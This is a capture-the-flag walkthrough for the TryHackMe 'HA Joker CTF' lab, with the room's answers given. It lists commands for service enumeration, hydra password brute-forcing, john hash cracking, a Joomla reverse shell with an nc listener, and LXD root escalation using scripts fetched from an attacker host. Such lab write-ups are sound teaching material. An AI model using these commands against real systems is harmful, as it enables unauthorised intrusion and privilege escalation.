# HA Joker CTF

{% embed url="https://tryhackme.com/room/jokerctf" %}
https://tryhackme.com/room/jokerctf
{% endembed %}

![](<../../.gitbook/assets/HA Joker CTF.png>)

## Task 1 HA Joker CTF

#### Enumerate services on target machine. **** What version of Apache is it? What version of Apache is it?

```bash
rustscan -a 10.10.17.110 -- -n -sVC
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 16-54-54.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-02 16-55-12.png>)

{% hint style="success" %}
`2.4.29`
{% endhint %}

#### What port on this machine not need to be authenticated by user and password?

{% hint style="success" %}
`80`
{% endhint %}

#### There is a file on this port that seems to be secret, what is it?

```bash
gobuster dir -u http://10.10.17.110/ \
             -w /usr/share/dirb/wordlists/common.txt \
             -x txt,bak,old,php -t128
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 17-11-47.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-02 17-12-52.png>)

{% hint style="success" %}
`secret.txt`
{% endhint %}

#### There is another file which reveals information of the backend, what is it?

![](<../../.gitbook/assets/Screenshot from 2022-04-02 17-17-40.png>)

{% hint style="success" %}
`phpinfo.php`
{% endhint %}

#### What port on this machine need to be authenticated by Basic Authentication Mechanism?

![](<../../.gitbook/assets/Screenshot from 2022-04-02 17-18-01.png>)

{% hint style="success" %}
`8080`
{% endhint %}

#### At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?

![](<../../.gitbook/assets/Screenshot from 2022-04-02 17-20-22.png>)

```bash
hydra -l joker -P /usr/share/wordlists/rockyou.txt \
      'http-get://10.10.17.110:8080/' -t64 -I
```

{% hint style="success" %}
`hannah`
{% endhint %}

#### Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?

```bash
nikto -h http://10.10.17.110:8080 -id 'joker:hannah'
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 17-45-10.png>)

{% hint style="success" %}
`/administrator/`
{% endhint %}

#### We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?

{% hint style="success" %}
`backup.zip`
{% endhint %}

#### We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?

```bash
wget --http-user joker --http-password hannah http://10.10.17.110:8080/backup.zip
unzip backup.zip
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 17-33-20.png>)

```bash
zip2john backup.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 17-34-28.png>)

{% hint style="success" %}
`hannah`
{% endhint %}

#### Remember that... We need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user\_table! What is the super duper user?

```bash
unzip backup.zip
cat db/joomladb.sql
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 17-36-23.png>)

{% hint style="success" %}
`admin`
{% endhint %}

#### Super Duper User! What is the password?

```bash
echo -n '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 17-41-53.png>)

{% hint style="success" %}
`abcd1234`
{% endhint %}

#### At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?

![](<../../.gitbook/assets/Screenshot from 2022-04-02 17-48-02.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-02 17-58-41.png>)

```bash
nc -nvlp 4444
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 18-18-29.png>)

{% hint style="success" %}
`www-data`
{% endhint %}

#### This user belongs to a group that differs on your own group, What is this group?

{% hint style="success" %}
`lxd`
{% endhint %}

#### Spawn a tty shell.

```bash
python3 -V
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### In this question you should be do a basic research on how linux containers (LXD) work, it has a small online tutorial.

#### **The idea here is to mount the root of the OS file system on the container, this should give us access to the root directory.** Create the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine.

```bash
searchsploit lxd
searchsploit -m 46978.sh
cp 46978.sh /var/www/html/lxd.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 18-48-11.png>)

```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
sudo bash build-alpine
cp alpine-*.tar.gz /var/www/html/alpine.tar.gz
```

```bash
wget http://10.6.9.176/lxd.sh -P /tmp
wget http://10.6.9.176/alpine.tar.gz -P /tmp
bash /tmp/lxd.sh -f /tmp/alpine.tar.gz
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 18-32-33.png>)

#### What is the name of the file in the /root directory?

```bash
ls -lA /mnt/root/root
cat /mnt/root/root/final.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-02 18-35-28.png>)

{% hint style="success" %}
final.txt
{% endhint %}

## Reference

{% embed url="https://www.hackingarticles.in/joomla-reverse-shell" %}

{% embed url="https://vk9-sec.com/reverse-shell-on-any-cms" %}

{% embed url="https://www.exploit-db.com/exploits/46978" %}
